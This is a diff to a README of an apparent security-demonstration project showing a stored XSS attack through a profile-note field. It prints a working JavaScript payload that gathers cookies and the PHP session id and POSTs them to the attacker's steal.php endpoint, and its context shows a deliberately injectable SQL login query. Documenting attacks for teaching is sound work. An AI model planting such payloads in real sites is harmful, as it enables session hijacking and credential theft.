@@ -104,11 +104,35 @@ $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";</c
 
 <h1 align="center">2.Secure Login System with Partial Sanitizing Code</h1>
 
+The attacker authenticates, accesses the "update profile" section, and injects the XSS payload into the "profile note" field before submitting the update. The code is stored RAW in the database without proper sanitization. Multiple payload types are available - this project demonstrates three variants: 1. Phishing payload 2. Password harvester 3. Silent credential extractor. These payloads extract sensitive data including cookies, storage objects, user information, browser details, form data, and page content based on payload configuration. A typical data collection payload example:
+
+<pre> <code><script>
+var stolenData = {
+    cookies: document.cookie,
+    sessionId: document.cookie.match(/PHPSESSID=([^;]+)/)[1],
+    url: window.location.href,
+    userAgent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+};
+// Data is prepared for transmission...
+</script></code> </pre>
+
 ![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_1.png)
 
 ![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_2.png)
 
+The payload sends the data to the attacker's server:
 
+<pre> <code> fetch('./steal.php', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(stolenData),
+    mode: 'no-cors'
+}).then(function() {
+    console.log('💰 Data stolen successfully!');
+}); </code> </pre>
+
+The payload transmits data to the attacker's server infrastructure. During this phase, steal.php processes the incoming JSON payload data, persists it to a .json file, and renders the collected information through dashboard.php
 
 ![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_3.png)
 
